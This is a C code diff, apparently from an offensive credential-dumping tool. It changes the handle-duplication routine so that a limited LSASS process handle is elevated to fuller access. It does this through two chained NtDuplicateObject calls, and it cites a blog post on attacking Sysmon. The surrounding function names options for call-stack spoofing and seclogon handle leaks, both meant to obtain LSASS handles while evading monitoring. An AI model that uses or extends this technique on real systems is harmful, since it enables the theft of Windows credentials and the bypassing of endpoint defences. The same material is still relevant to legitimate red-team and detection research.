@@ -213,12 +213,14 @@ HANDLE make_handle_full_access(
     return hDuped;
 }
 
-HANDLE duplicate_handle_local(
+// https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html
+HANDLE elevate_handle_via_duplicate(
     IN HANDLE hProcess,
     IN ACCESS_MASK DesiredAccess,
     IN DWORD HandleAttributes)
 {
-    HANDLE hDuped = NULL;
+    HANDLE hDupPriv = NULL;
+    HANDLE hHighPriv = NULL;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     ULONG options = 0;
 
@@ -232,7 +234,21 @@ HANDLE duplicate_handle_local(
         NtCurrentProcess(),
         hProcess,
         NtCurrentProcess(),
-        &hDuped,
+        &hDupPriv,
+        PROCESS_DUP_HANDLE,
+        FALSE,
+        0);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    status = NtDuplicateObject(
+        hDupPriv,
+        NtCurrentProcess(),
+        NtCurrentProcess(),
+        &hHighPriv,
         DesiredAccess,
         HandleAttributes,
         options);
@@ -245,13 +261,15 @@ HANDLE duplicate_handle_local(
     DPRINT(
         "Duplicated handle: 0x%lx -> 0x%lx",
         (DWORD)(ULONG_PTR)hProcess,
-        (DWORD)(ULONG_PTR)hDuped);
+        (DWORD)(ULONG_PTR)hHighPriv);
 
 cleanup:
     if (hProcess)
         NtClose(hProcess);
+    if (hDupPriv)
+        NtClose(hDupPriv);
 
-    return hDuped;
+    return hHighPriv;
 }
 
 // get a handle to LSASS via multiple methods
@@ -259,7 +277,7 @@ BOOL obtain_lsass_handle(
     OUT PHANDLE phProcess,
     IN DWORD lsass_pid,
     IN BOOL duplicate_handle,
-    IN BOOL duplicate_local,
+    IN BOOL elevate_handle,
     IN BOOL use_seclogon_duplicate,
     IN DWORD spoof_callstack,
     IN BOOL is_seclogon_leak_local_stage_2,
@@ -326,7 +344,7 @@ BOOL obtain_lsass_handle(
     duplicate_permissions = permissions;
 
     // if --duplicate-local was provided, we use PROCESS_QUERY_LIMITED_INFORMATION
-    if (duplicate_local)
+    if (elevate_handle)
     {
         permissions = PROCESS_QUERY_LIMITED_INFORMATION;
     }
@@ -347,9 +365,9 @@ BOOL obtain_lsass_handle(
     if (!success)
         goto cleanup;
 
-    if (duplicate_local)
+    if (elevate_handle)
     {
-        hProcess = duplicate_handle_local(
+        hProcess = elevate_handle_via_duplicate(
             hProcess,
             duplicate_permissions,
             attributes);
